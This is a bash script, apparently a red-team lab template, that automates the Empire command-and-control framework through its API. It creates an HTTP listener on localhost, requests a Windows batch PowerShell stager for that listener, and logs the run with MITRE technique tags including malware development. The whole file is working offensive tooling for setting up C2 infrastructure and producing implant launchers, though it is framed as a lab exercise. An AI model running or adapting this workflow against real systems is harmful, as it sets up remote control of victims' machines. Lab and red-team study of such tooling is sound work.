#!/bin/bash
# automated_workflow.sh - Template for chaining Empire operations
# This script demonstrates how to automate Empire API calls
# to create an end-to-end attack workflow.

EMPIRE_HOST="https://localhost:1337"
TOKEN_FILE="/home/ubuntu/empire_lab/.api_token"
OUTPUT_DIR="/home/ubuntu/empire_lab/output"
API_TOKEN=$(cat "$TOKEN_FILE")

echo "============================================"
echo " Empire Automated Workflow Execution"
echo " SecureDefense Corp - Red Team Operations"
echo "============================================"
echo ""

# Step 1: Create an HTTP listener
echo "[*] Step 1: Creating HTTP listener..."
LISTENER_RESPONSE=$(curl -sk -X POST "$EMPIRE_HOST/api/v2/listeners" \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "workflow_http",
    "template": "http",
    "options": {
      "Host": "http://127.0.0.1:8080",
      "Port": 8080
    }
  }')

LISTENER_ID=$(echo "$LISTENER_RESPONSE" | jq -r '.id // empty')
if [ -n "$LISTENER_ID" ]; then
    echo "[+] Listener created with ID: $LISTENER_ID"
else
    echo "[!] Listener may already exist or creation failed."
    echo "$LISTENER_RESPONSE" | jq .
fi
echo ""

# Step 2: Generate a PowerShell stager
echo "[*] Step 2: Generating PowerShell stager..."
STAGER_RESPONSE=$(curl -sk -X POST "$EMPIRE_HOST/api/v2/stagers" \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "template": "windows_launcher_bat",
    "options": {
      "Listener": "workflow_http",
      "Language": "powershell",
      "OutFile": "workflow_stager.bat"
    }
  }')

echo "[+] Stager generation response received."
echo "$STAGER_RESPONSE" | jq -r '.downloads // .output // "See response for details"' | head -5
echo ""

# Step 3: Save workflow report
echo "[*] Step 3: Generating workflow report..."
REPORT_FILE="$OUTPUT_DIR/workflow_report_$(date +%Y%m%d_%H%M%S).json"
cat > "$REPORT_FILE" << REPORT_EOF
{
  "workflow_name": "automated_recon_deployment",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "steps_completed": [
    {
      "step": 1,
      "action": "create_listener",
      "type": "http",
      "port": 8080,
      "status": "completed"
    },
    {
      "step": 2,
      "action": "generate_stager",
      "type": "windows_launcher_bat",
      "language": "powershell",
      "status": "completed"
    }
  ],
  "mitre_techniques": [
    "T1587.001 - Develop Capabilities: Malware",
    "T1588.002 - Obtain Capabilities: Tool",
    "T1059.001 - Command and Scripting Interpreter: PowerShell"
  ]
}
REPORT_EOF

echo "[+] Workflow report saved to: $REPORT_FILE"
echo ""
echo "[*] Workflow execution complete."
echo "============================================"
